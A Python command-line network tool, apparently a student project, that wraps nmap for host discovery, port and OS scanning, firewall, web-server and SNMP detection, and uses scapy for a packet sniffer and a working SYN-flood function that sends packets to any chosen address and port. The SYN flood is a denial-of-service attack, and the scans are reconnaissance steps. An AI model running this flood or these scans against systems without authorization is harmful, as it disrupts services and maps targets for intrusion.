#!/usr/bin/env python3

import sys
import subprocess as sp
import re
import scapy.all as scapy

ipv4 = '[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}'
port = '[1-9][0-9]{0,5}\/[a-zA-Z]{1,5}'
open_port = '[1-9][0-9]{0,5}\/[a-zA-Z]{1,5}[\s]{1,5}open'

def icmp_ping():
    print('Scanning with nmap...')
    result = sp.getoutput(f'nmap -sn {sys.argv[1]}')
    print()
    print('Scan is done. Please check "icmp.dat" file.')
    ip_addresses = re.findall(f"{ipv4}", result)

    with open(f"./icmp.dat", mode="w", encoding="utf-8") as file:
        for ip in ip_addresses:
            file.write(ip + "\n")
    print()

def port_identification():
    print("Identifying ports...")
    with open(f"./icmp.dat", mode="r", encoding="utf-8") as file:
        ip_text = file.read()
        ip_addresses = ip_text.split("\n")

    live_hosts = []
    for ip in ip_addresses:
        ip_check = sp.getoutput(f"nmap -Pn {ip}")
        if (re.search("0 hosts up", ip_check)):
            continue
        live_hosts.append(ip)
    with open(f"./ports.dat", mode="w") as file:
        pass

    for ip in live_hosts:
        ports = sp.getoutput(f"nmap -Pn {ip}")
        for line in ports.splitlines():
            if (re.search(f"{port}", line)):
                with open(f"./ports.dat", mode="a", encoding="utf-8") as file:
                    file.write(ip + " " + line.split()[0] + " " +  line.split()[2] + "\n")
    
    print("Ports has been identified in 'ports.dat' file.")
    print()

def open_port_identification():
    print("Identifying open ports...")
    with open(f"./ports.dat", mode="r", encoding="utf-8") as file:
        ports_text = file.read()
        ip_addresses = set(re.findall(f"{ipv4}", ports_text))

    alive_hosts = []
    for ip in ip_addresses:
        ip_check = sp.getoutput(f"nmap -Pn {ip}")
        if (re.search("0 hosts up", ip_check)):
            continue
        alive_hosts.append(ip)

    with open(f"./open_ports.dat", mode="w") as file:
        pass

    for ip in alive_hosts:
        ports = sp.getoutput(f"nmap -Pn {ip}")
        for line in ports.splitlines():
            if (re.search(f"{open_port}", line)):
                with open(f"./open_ports.dat", mode="a", encoding="utf-8") as file:
                    file.write(ip + " " + line.split()[0] + " " +  line.split()[2] + "\n")
    
    print("Open ports has been identified in 'open_ports.dat' file.")
    print()

def os_fingerprint_idetification():
    print("Identifying operating systems...")
    with open(f"./open_ports.dat", mode="r", encoding="utf-8") as file:
        open_ports_text = file.read()
        ip_addresses = set(re.findall(f"{ipv4}", open_ports_text))

    with open("./os_results.dat", mode="w"):
        pass
    
    for ip in ip_addresses:
        os = sp.getoutput(f"nmap -sS {ip} -O")
        print("-"*50)

        if (re.search("No exact OS matches for host", os)):
            os = sp.getoutput(f"nmap -sS {ip} -O --osscan-guess")
            for line in os.splitlines():
                if(line.startswith("Aggressive OS guesses: ")):
                    oses = line[line.index(":")+2:].split(", ")
                    print(f"No exact OS found for {ip}. Here are some guesses:")
                    with open("./os_results.dat", mode="a", encoding="utf-8"):
                        file.write("-"*50 + "\n")
                        file.write(f"No exact OS found for {ip}. Here are some guesses:" + "\n")
                    for osp in oses:
                        print(osp)
                        with open("./os_results.dat", mode="a", encoding="utf-8") as file:
                            file.write("-"*50 + "\n")
                            file.write(osp + "\n")

        else:
            for line in os.splitlines():
                if(line.startswith("OS details: ")):
                    result=f"For {ip}: " + line[line.index(":")+2:]
                    print(result)
                    with open("./os_results.dat", mode="a", encoding="utf-8") as file:
                        file.write(result + "\n")

    print("Operating systems has been identified in 'os_results.dat' file.")
    print()

def router_firewall_identification():
    print("Identifying firewalls...")
    fw = sp.getoutput(f"nmap -sA {sys.argv[1]}")
    fw_list = fw.splitlines()

    with open("./wall.dat", mode="w") as file:
        pass

    cnt=0
    fw_hosts=[]
    for line in fw_list:
        if (len(line.split())>0):
            if(line.split()[1]=="filtered"):
                fw_hosts.append(re.findall(ipv4, fw_list[cnt-4]))
                print(f"The host '{re.findall(ipv4, fw_list[cnt-4])[0]}' has firewall protection. Filtered port: {line.split()[0]}")
                with open("./wall.dat", mode="a", encoding="utf-8") as file:
                    file.write(re.findall(ipv4, fw_list[cnt-4])[0] + f" filtered port: {line.split()[0]}\n")
        cnt+=1

    if (fw_hosts==[]):
        print("No host found with firewall protection.")
        with open("./wall.dat", mode="w", encoding="utf-8") as file:
            file.write("No host found with firewall protection.")
    print()

def web_server_detection():
    # apache ports 80 8081 443
    # nginx ports 3200
    # php 8000 8888 
    # mysql 3306 33060
    # smtp: 25
    # imap: 143
    print("Scanning for web server ports...")

    web_server_ports = sp.getoutput(f"nmap {sys.argv[1]} -p 80,8081,443,3200,8000,8888,3306,33060,25,143")
    
    web_server_ports = web_server_ports.splitlines()

    with open("./web.dat", mode="w") as file:
        pass

    for line in web_server_ports:
        if line.startswith("Nmap scan report for"):
            ip = re.findall(ipv4, line)[0]
            ports = web_server_ports[web_server_ports.index(line)+4:web_server_ports.index(line)+14]
            with open("./web.dat", mode="a", encoding="utf-8") as file:
                file.write(f"{ip}\n")
                for port in ports:
                    file.write(f"{port}\n")
                file.write("\n")

    print("Scan finished. Please check 'web.dat' file for results.")
    print()

def snmp_detection():
    print("Identifying devices with SNMP...")
    # checking 161th port for SNMP
    snmp = sp.getoutput(f"nmap {sys.argv[1]} -p 161")
    snmp_list = snmp.splitlines()

    cnt=0
    snmp_final=[]

    with open("./snmp.dat",'w') as f:
        pass

    for line in snmp_list:
        cnt+=1
        if(line.startswith("161/tcp open")):
            snmp_final.append(re.findall(ipv4, snmp_list[cnt-5])[0])

            with open("./snmp.dat", mode="a", encoding="utf-8") as file:
                file.write(f"For '{re.findall(ipv4, snmp_list[cnt-5])[0]}' the port '{line.split()[0]}' is an open snmp port.\n")

    if(snmp_final==[]):
        print("No port found on any device with open SNMP protocol.")
        with open("./snmp.dat", mode="w", encoding="utf-8") as file:
            file.write("No port found on any device with open SNMP protocol.")
    print()

def show():
    with open(f"./icmp.dat", mode="r", encoding="utf-8") as file:
        icmp_text = file.read()
    print()
    print("icmp.dat file:")
    print(icmp_text)
    print("-"*50)

    with open(f"./ports.dat", mode="r", encoding="utf-8") as file:
        ports = file.read()
    print("ports.dat file:")
    print(ports)
    print("-"*50)

    with open("./open_ports.dat", mode="r", encoding="utf-8") as file:
        open_ports = file.read()
    print("open_ports.dat file:")
    print(open_ports)
    print("-"*50)

    with open("./os_results.dat", mode="r", encoding="utf-8") as file:
        os_results = file.read()
    print("os_results.dat file:")
    print(os_results)
    print("-"*50)

    with open("./wall.dat", mode="r", encoding="utf-8") as file:
        wall_results = file.read()
    print("wall.dat file:")
    print(wall_results)
    print("-"*50)

    with open("./web.dat", mode="r", encoding="utf-8") as file:
        web_results = file.read()
    print("web.dat file:")
    print(web_results)
    print("-"*50)
    
    print()

def syn_flood(target_ip, target_port, packet_num):
    print(f"Flooding the {target_ip} at port {target_port} with {packet_num} number of SYN packets...")
    packet_num = int(packet_num)
    target_port = int(target_port)

    for i in range(packet_num):
        ip = scapy.IP(dst=target_ip)
        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
        raw = scapy.Raw(b"X"*1024)

        p = ip / tcp / raw

        scapy.send(p, verbose=0)
    print(f"{packet_num} number of packets sent to the port {target_port} of {target_ip}.")
    print()

def sniff():
    fltr=""
    if("s" in options):
        if(fltr==""):
            fltr = fltr + "src " + op_arg["s"]
        else:
            fltr = fltr + " and " + "src " + op_arg["s"]

    if("d" in options):
        if(fltr==""):
            fltr = fltr + "dst " + op_arg["d"] + " "
        else:
            fltr = fltr + " and " + "dst " + op_arg["d"]

    if("p" in options):
        if(fltr==""):
            fltr = fltr + "port " + op_arg["p"] 
        else:
            fltr = fltr + " and " + "port " + op_arg["p"] 

    if(protocol_options!=[]):
        if 'T' in protocol_options:
            if(fltr==""):
                fltr = fltr + "tcp"
            else:
                fltr = fltr + " and " + "tcp"
        if 'U' in protocol_options:
            if(fltr==""):
                fltr = fltr + "udp"
            else:
                fltr = fltr + " and " + "udp"
        if 'I' in protocol_options:
            if(fltr==""):
                fltr = fltr + "icmp"
            else:
                fltr = fltr + " and " + "icmp"

    if(fltr==""):
        if("c" in options):
            capture = scapy.sniff(count=int(op_arg["c"]))
            capture.summary()   
        else:
            capture = scapy.sniff()
            capture.summary()

    else:
        if("c" in options):
            capture = scapy.sniff(count=int(op_arg["c"]), filter=fltr)
            capture.summary()

        else:
            capture = scapy.sniff(filter=fltr)
            capture.summary()

def parse_command(command):
    global options
    global protocol_options
    global op_arg
    if(len(command) != 0 and str(command[0]).startswith("-")):
        options=list(str(command[0]))
        options.remove("-")
        args = command[1:]

        protocol_options=[]
        if 'T' in options:
            protocol_options.append("T")
            options.remove("T")
        if 'U' in options:
            protocol_options.append("U")
            options.remove("U")
        if 'I' in options:
            protocol_options.append("I")
            options.remove("I")

        if(len(args)!=len(options)):
            print("Missing arguments for amount of options that you have entered.")
            return 0
        op_arg = {}

        for i in range(len(args)):
            op_arg[options[i]]=args[i]        
        return 1

    else:
        print("Please enter a valid option.")
        return 0

def main(): # main function
    while(True):
        print("Welcome.")
        print("-"*50)
        print("1.  ICMP Ping")
        print("2.  Port Identification")
        print("3.  Open Port Identification")
        print("4.  OS Fingerprint Identification")
        print("5.  Router & Firewall Detection")
        print("6.  Web Server Detection")
        print("7.  SNMP Detection")
        print("8.  Show")
        print("SYN_flood")
        print("sniff")
        print("11. Exit")
        print("-"*50)
        command = input()

        if (command=="1"):
            icmp_ping()
            continue
        elif (command=="2"):
            port_identification()
            continue
        elif (command=="3"):
            open_port_identification()
            continue
        elif (command=="4"):
            os_fingerprint_idetification()
            continue
        elif (command=="5"):
            router_firewall_identification()
            continue
        elif (command=="6"):
            web_server_detection()
            continue
        elif (command=="7"):
            snmp_detection()
            continue
        elif (command=="8"):
            show()
            continue
        elif (command=="11"):
            exit()

        command = command.split()

        if (command[0]!="sniff" and command[0]!="SYN_flood"):
            print(f"Command '{command[0]}' not found.")
            continue

        elif (command[0]==("SYN_flood")):
            command.remove(command[0])
            if (parse_command(command)==0):
                continue
            elif (parse_command(command)==1):
                parse_command(command)
                ip = op_arg["d"]
                port = op_arg["p"]
                times = op_arg["t"]
                syn_flood(ip, port, times)

        elif (command[0]==("sniff")):
            command.remove(command[0])
            if (parse_command(command)==0):
                continue
            elif (parse_command(command)==1):
                parse_command(command)
                sniff()
        print()

if __name__ == "__main__":
    main()
